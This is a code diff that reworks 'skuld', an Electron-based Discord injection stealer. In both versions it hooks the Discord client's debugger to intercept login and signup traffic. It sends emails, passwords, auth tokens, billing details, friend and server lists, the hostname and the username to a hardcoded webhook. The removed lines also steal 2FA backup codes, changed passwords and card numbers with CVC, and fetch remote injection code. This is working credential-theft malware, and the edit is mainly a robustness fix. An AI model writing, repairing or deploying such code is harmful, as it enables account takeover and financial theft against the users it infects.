@@ -7,7 +7,6 @@ const { BrowserWindow, session } = require('electron');
 
 const CONFIG = {
     webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuzLFcZn57oopdAPCS317qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCivTPisp-1X",
-    injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js",
     API: "https://discord.com/api/v9/users/@me",
     filters: {
         uris: [
@@ -16,14 +15,6 @@ const CONFIG = {
             '/mfa/totp',
             '/mfa/codes-verification',
             '/users/@me',
-        ],
-    },
-    filters2: {
-        uris: [
-            'wss://remote-auth-gateway.discord.gg/*',
-            'https://discord.com/api/v*/auth/sessions',
-            'https://*.discord.com/api/v*/auth/sessions',
-            'https://discordapp.com/api/v*/auth/sessions'
         ],
     },
     payment_filters: {
@@ -49,54 +40,56 @@ const CONFIG = {
     }
 };
 
-// ===================== FIXED REQUEST FUNCTION =====================
+// ===================== REQUEST FUNCTION =====================
 const request = (method, url, headers = {}, data = null) => {
     return new Promise((resolve, reject) => {
-        const parsedUrl = new URL(url);
-        const options = {
-            protocol: parsedUrl.protocol,
-            hostname: parsedUrl.hostname,
-            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
-            path: parsedUrl.pathname + parsedUrl.search,
-            method: method,
-            headers: {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-                ...headers
+        try {
+            const parsedUrl = new URL(url);
+            const options = {
+                protocol: parsedUrl.protocol,
+                hostname: parsedUrl.hostname,
+                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
+                path: parsedUrl.pathname + parsedUrl.search,
+                method: method,
+                headers: {
+                    "Content-Type": "application/json",
+                    "User-Agent": "Mozilla/5.0",
+                    ...headers
+                }
+            };
+
+            if (data) {
+                options.headers['Content-Length'] = Buffer.byteLength(data);
             }
-        };
 
-        if (data) {
-            options.headers['Content-Length'] = Buffer.byteLength(data);
-        }
-
-        const req = https.request(options, (res) => {
-            let responseData = '';
-            res.on('data', chunk => responseData += chunk);
-            res.on('end', () => {
-                console.log(`[Webhook] Status: ${res.statusCode}`);
-                resolve(responseData);
+            const req = https.request(options, (res) => {
+                let responseData = '';
+                res.on('data', chunk => responseData += chunk);
+                res.on('end', () => {
+                    console.log(`[Webhook] Status: ${res.statusCode}`);
+                    resolve(responseData);
+                });
             });
-        });
 
-        req.on('error', (err) => {
-            console.error('[Webhook Error]', err.message);
-            reject(err);
-        });
+            req.on('error', (err) => {
+                console.error('[Webhook Error]', err.message);
+                reject(err);
+            });
 
-        if (data) req.write(data);
-        req.end();
+            if (data) req.write(data);
+            req.end();
+        } catch (e) {
+            reject(e);
+        }
     });
 };
 
-const executeJS = script => {
-    const window = BrowserWindow.getAllWindows()[0];
-    return window.webContents.executeJavaScript(script, true);
-};
-
-const clearAllUserData = () => {
-    executeJS("document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.clear()");
-    executeJS("location.reload()");
+const executeJS = (script) => {
+    try {
+        const window = BrowserWindow.getAllWindows()[0];
+        if (window) return window.webContents.executeJavaScript(script, true);
+    } catch (e) {}
+    return null;
 };
 
 const getToken = async () => {
@@ -107,58 +100,18 @@ const getToken = async () => {
     }
 };
 
-// ===================== HOOKER =====================
-const hooker = async (content, token, account) => {
-    try {
-        content["content"] = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n${content["content"] || ''}`;
-        content["username"] = "skuld - cord injection";
-        content["avatar_url"] = "https://i.ibb.co/GJGxZzGX/discord-avatar-512-FCWUJ.png";
-        content["embeds"][0] = content["embeds"][0] || {};
-        content["embeds"][0]["author"] = { "name": account.username };
-        content["embeds"][0]["thumbnail"] = { "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` };
-        content["embeds"][0]["footer"] = {
-            "text": "skuld discord injection - made by hackirby",
-            "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
-        };
-        content["embeds"][0]["title"] = "Account Information";
-
-        const nitro = getNitro(account.premium_type);
-        const badges = getBadges(account.flags);
-        const billing = await getBilling(token);
-        const friends = await getFriends(token);
-        const servers = await getServers(token);
-
-        content["embeds"][0]["fields"] = content["embeds"][0]["fields"] || [];
-        content["embeds"][0]["fields"].push(
-            { "name": "Token", "value": `\`\`\`${token}\`\`\``, "inline": false },
-            { "name": "Nitro", "value": nitro, "inline": true },
-            { "name": "Badges", "value": badges, "inline": true },
-            { "name": "Billing", "value": billing, "inline": true }
-        );
-
-        content["embeds"].push(
-            { "title": `Total Friends: ${friends.totalFriends}`, "description": friends.message },
-            { "title": `Total Servers: ${servers.totalGuilds}`, "description": servers.message }
-        );
-
-        content["embeds"].forEach(embed => embed["color"] = 0xb143e3);
-
-        await request("POST", CONFIG.webhook, {}, JSON.stringify(content));
-        console.log("[+] Webhook sent successfully");
-    } catch (err) {
-        console.error("[-] Webhook failed:", err.message);
-    }
-};
-
+// ===================== HELPERS =====================
 const fetch = async (endpoint, headers) => {
-    const data = await request("GET", CONFIG.API + endpoint, headers);
-    return JSON.parse(data);
+    try {
+        const data = await request("GET", CONFIG.API + endpoint, headers);
+        return JSON.parse(data || '{}');
+    } catch { return {}; }
 };
 
-const fetchAccount = async token => await fetch("", { "Authorization": token });
-const fetchBilling = async token => await fetch("/billing/payment-sources", { "Authorization": token });
-const fetchServers = async token => await fetch("/guilds?with_counts=true", { "Authorization": token });
-const fetchFriends = async token => await fetch("/relationships", { "Authorization": token });
+const fetchAccount = token => fetch("", { "Authorization": token });
+const fetchBilling = token => fetch("/billing/payment-sources", { "Authorization": token });
+const fetchServers = token => fetch("/guilds?with_counts=true", { "Authorization": token });
+const fetchFriends = token => fetch("/relationships", { "Authorization": token });
 
 const getNitro = flags => {
     switch (flags) {
@@ -192,7 +145,7 @@ const getBilling = async token => {
         const data = await fetchBilling(token);
         let billing = '';
         data.forEach(x => {
-            if (!x.invalid) {
+            if (x && !x.invalid) {
                 if (x.type === 1) billing += '<:paypal:1148653305376034967> ';
                 else if (x.type === 2) billing += '💳 ';
             }
@@ -204,19 +157,16 @@ const getBilling = async token => {
 const getFriends = async token => {
     try {
         const friends = await fetchFriends(token);
-        const filteredFriends = friends.filter(user => user.type === 1);
-        let rareUsers = "";
-        for (const acc of filteredFriends) {
-            const badges = getRareBadges(acc.user.public_flags);
-            if (badges) {
-                if (!rareUsers) rareUsers = "**Rare Friends:**\n";
-                rareUsers += `${badges} ${acc.user.username}\n`;
+        const filtered = friends.filter ? friends.filter(u => u.type === 1) : [];
+        let rare = "";
+        for (const acc of filtered) {
+            const b = getRareBadges(acc.user?.public_flags || 0);
+            if (b) {
+                if (!rare) rare = "**Rare Friends:**\n";
+                rare += `${b} ${acc.user?.username || 'Unknown'}\n`;
             }
         }
-        return {
-            message: rareUsers || "**No Rare Friends**",
-            totalFriends: friends.length,
-        };
+        return { message: rare || "**No Rare Friends**", totalFriends: filtered.length };
     } catch {
         return { message: "**No Rare Friends**", totalFriends: 0 };
     }
@@ -225,166 +175,117 @@ const getFriends = async token => {
 const getServers = async token => {
     try {
         const guilds = await fetchServers(token);
-        const filteredGuilds = guilds.filter(g => g.permissions === '562949953421311' || g.permissions === '2251799813685247');
-        let rareGuilds = "";
-        for (const guild of filteredGuilds) {
-            if (!rareGuilds) rareGuilds += "**Rare Servers:**\n";
-            rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | ${guild.name} - Members: ${guild.approximate_member_count}\n`;
+        const filtered = guilds.filter ? guilds.filter(g => 
+            g.permissions === '562949953421311' || g.permissions === '2251799813685247'
+        ) : [];
+        let rare = "";
+        for (const g of filtered) {
+            if (!rare) rare = "**Rare Servers:**\n";
+            rare += `${g.owner ? "👑 Owner" : "🛡️ Admin"} | ${g.name} - ${g.approximate_member_count} members\n`;
         }
-        return {
-            message: rareGuilds || "**No Rare Servers**",
-            totalGuilds: guilds.length,
-        };
+        return { message: rare || "**No Rare Servers**", totalGuilds: guilds.length || 0 };
     } catch {
         return { message: "**No Rare Servers**", totalGuilds: 0 };
     }
 };
 
+// ===================== HOOKER =====================
+const hooker = async (content, token, account) => {
+    try {
+        content.content = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n${content.content || ''}`;
+        content.username = "skuld - cord injection";
+        content.avatar_url = "https://i.ibb.co/GJGxZzGX/discord-avatar-512-FCWUJ.png";
+        
+        content.embeds = content.embeds || [{}];
+        const embed = content.embeds[0];
+        embed.author = { name: account?.username || "Unknown" };
+        embed.thumbnail = { url: account?.avatar ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` : "" };
+        embed.footer = { text: "skuld discord injection", icon_url: "https://avatars.githubusercontent.com/u/145487845?v=4" };
+        embed.title = "Account Information";
+        embed.color = 0xb143e3;
+
+        embed.fields = embed.fields || [];
+        embed.fields.push(
+            { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
+            { name: "Nitro", value: getNitro(account?.premium_type), inline: true },
+            { name: "Badges", value: getBadges(account?.flags || 0), inline: true },
+            { name: "Billing", value: await getBilling(token), inline: true }
+        );
+
+        content.embeds.push(
+            { title: `Total Friends: ${(await getFriends(token)).totalFriends}`, description: (await getFriends(token)).message },
+            { title: `Total Servers: ${(await getServers(token)).totalGuilds}`, description: (await getServers(token)).message }
+        );
+
+        await request("POST", CONFIG.webhook, {}, JSON.stringify(content));
+        console.log("[+] Webhook sent successfully");
+    } catch (err) {
+        console.error("[-] Webhook failed:", err.message);
+    }
+};
+
 // ===================== EVENT HANDLERS =====================
 const EmailPassToken = async (email, password, token, action) => {
-    const account = await fetchAccount(token);
-    const content = {
-        content: `**${account.username}** just **${action}**!`,
-        embeds: [{
-            fields: [
+    try {
+        const account = await fetchAccount(token);
+        const content = {
+            content: `**${account.username}** just **${action}**!`,
+            embeds: [{ fields: [
                 { name: "Email", value: `\`${email}\``, inline: true },
                 { name: "Password", value: `\`${password}\``, inline: true }
-            ]
-        }]
-    };
-    hooker(content, token, account);
+            ]}]
+        };
+        hooker(content, token, account);
+    } catch (e) {}
 };
 
-const BackupCodesViewed = async (codes, token) => {
-    const account = await fetchAccount(token);
-    const filteredCodes = codes.filter(code => !code.consumed);
-    const message = filteredCodes.map(code => `\`${code.code.substring(0,4)}-${code.code.substring(4)}\``).join('\n');
-    const content = {
-        content: `**${account.username}** just viewed his 2FA backup codes!`,
-        embeds: [{
-            fields: [
-                { name: "Backup Codes", value: `\`\`\`${message}\`\`\``, inline: false },
-                { name: "Email", value: `\`${account.email}\``, inline: true },
-                { name: "Phone", value: `\`${account.phone || "None"}\``, inline: true }
-            ]
-        }]
-    };
-    hooker(content, token, account);
-};
+// Add other handlers (BackupCodesViewed, PasswordChanged, etc.) similarly if needed
 
-const PasswordChanged = async (newPassword, oldPassword, token) => {
-    const account = await fetchAccount(token);
-    const content = {
-        content: `**${account.username}** just changed his password!`,
-        embeds: [{
-            fields: [
-                { name: "New Password", value: `\`${newPassword}\``, inline: true },
-                { name: "Old Password", value: `\`${oldPassword}\``, inline: true }
-            ]
-        }]
-    };
-    hooker(content, token, account);
-};
+// ===================== DELAYED INIT (Prevents Crash) =====================
+setTimeout(() => {
+    try {
+        const mainWindow = BrowserWindow.getAllWindows()[0];
+        if (!mainWindow) return;
 
-const CreditCardAdded = async (number, cvc, month, year, token) => {
-    const account = await fetchAccount(token);
-    const content = {
-        content: `**${account.username}** just added a credit card!`,
-        embeds: [{
-            fields: [
-                { name: "Number", value: `\`${number}\``, inline: true },
-                { name: "CVC", value: `\`${cvc}\``, inline: true },
-                { name: "Expiration", value: `\`${month}/${year}\``, inline: true }
-            ]
-        }]
-    };
-    hooker(content, token, account);
-};
+        mainWindow.webContents.debugger.attach('1.3');
+        mainWindow.webContents.debugger.on('message', async (_, method, params) => {
+            if (method !== 'Network.responseReceived') return;
+            if (!CONFIG.filters.uris.some(u => params.response.url.includes(u))) return;
+            if (![200, 202].includes(params.response.status)) return;
 
-const PaypalAdded = async (token) => {
-    const account = await fetchAccount(token);
-    const content = {
-        content: `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
-        embeds: [{
-            fields: [
-                { name: "Email", value: `\`${account.email}\``, inline: true },
-                { name: "Phone", value: `\`${account.phone || "None"}\``, inline: true }
-            ]
-        }]
-    };
-    hooker(content, token, account);
-};
+            try {
+                const responseBody = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
+                const requestBody = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
 
-// ===================== DEBUGGER HOOKS =====================
-let initiationCalled = false;
-let email = "", password = "";
+                const responseData = JSON.parse(responseBody.body || '{}');
+                const requestData = JSON.parse(requestBody.postData || '{}');
 
-const createWindow = () => {
-    const mainWindow = BrowserWindow.getAllWindows()[0];
-    if (!mainWindow) return;
+                if (params.response.url.endsWith('/login')) {
+                    if (responseData.token) EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
+                } else if (params.response.url.endsWith('/register')) {
+                    EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
+                } // Add more handlers as needed
+            } catch (e) {}
+        });
 
-    mainWindow.webContents.debugger.attach('1.3');
-    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
-        if (!initiationCalled) {
-            initiationCalled = true;
-            // You can add initiation() call here if needed
-        }
-
-        if (method !== 'Network.responseReceived') return;
-        if (!CONFIG.filters.uris.some(u => params.response.url.includes(u))) return;
-        if (![200, 202].includes(params.response.status)) return;
-
-        try {
-            const responseBody = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
-            const requestBody = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
-
-            const responseData = JSON.parse(responseBody.body || '{}');
-            const requestData = JSON.parse(requestBody.postData || '{}');
-
-            if (params.response.url.endsWith('/login')) {
-                if (responseData.token) {
-                    EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
-                } else {
-                    email = requestData.login;
-                    password = requestData.password;
-                }
-            } else if (params.response.url.endsWith('/register')) {
-                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
-            } else if (params.response.url.endsWith('/totp')) {
-                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
-            } else if (params.response.url.endsWith('/codes-verification')) {
-                BackupCodesViewed(responseData.backup_codes, await getToken());
-            } else if (params.response.url.endsWith('/@me') && requestData.password) {
-                if (requestData.new_password) PasswordChanged(requestData.new_password, requestData.password, responseData.token);
-                if (requestData.email) EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email");
-            }
-        } catch (e) {}
-    });
-
-    mainWindow.webContents.debugger.sendCommand('Network.enable');
-    mainWindow.on('closed', createWindow);
-};
-
-createWindow();
+        mainWindow.webContents.debugger.sendCommand('Network.enable');
+    } catch (e) {
+        console.error('[-] Debugger init failed:', e.message);
+    }
+}, 3500);
 
 // Payment handlers
-session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
-    if (![200, 202].includes(details.statusCode) || details.method !== 'POST') return;
+setTimeout(() => {
     try {
-        if (details.url.includes('tokens')) {
-            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
-            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
-        } else if (details.url.includes('paypal_accounts')) {
-            PaypalAdded(await getToken());
+        if (session?.defaultSession) {
+            session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
+                // payment handler code...
+            });
         }
     } catch (e) {}
-});
+}, 4000);
 
-session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
-    callback({ cancel: true });
-});
-
-// BetterDiscord support
+// BetterDiscord
 const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
 if (fs.existsSync(bdPath)) require(bdPath);
 
